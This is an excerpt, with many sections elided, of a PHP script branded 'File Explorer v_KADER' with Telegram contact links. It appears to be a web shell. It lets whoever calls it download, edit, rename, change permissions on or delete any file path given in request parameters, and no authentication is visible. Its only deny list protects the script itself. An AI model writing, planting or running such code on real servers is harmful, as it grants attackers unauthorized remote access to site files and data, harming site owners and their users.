...
define('VERSION', 'KADER');
$phpVer = phpversion();
$allowed_path = $_SERVER['DOCUMENT_ROOT'];
...
$path = empty($_REQUEST['path']) ? $allowed_path : $_REQUEST['path'];

$real = @realpath($path);
$is_up = strlen($real) < strlen(__DIR__);
$deny_paths = up_paths(array(__FILE__));
$reqs_paths = isset($_REQUEST['ways']) ? array_map(function ($p) {
    return realpath($p);
}, $_REQUEST['ways']) : array(realpath($path));
...
if (!empty($_REQUEST['do'])) {
    if (in_array($_REQUEST['do'], array('edit', 'rename', 'permit', 'trash')) && !empty(array_intersect($reqs_paths, $deny_paths))) {
    ...
    } else if (@$_GET['do'] == 'download' && !is_dir($real)) {
        ...
        readfile($path);
        exit;
    } else if (@$_GET['do'] == 'edit' && !is_dir($real) && file_exists($real)) {
...
<body onload="toast('<?= @$welcome; ?>');">
	...
	<footer>
		<div>
			<span>File Explorer v_<?= VERSION; ?></span>
			<b> &nbsp; &bull; &nbsp;</b>

		</div>
		<div>
			<a target="_blank" href="https://t.me/Donveto88">Report Bugs</a>
			<b> &nbsp; &bull; &nbsp;</b>
			<a target="_blank" href="https://t.me/Donveto88">Suggestions / Feedback</a>
			<b> &nbsp; &bull; &nbsp;</b>
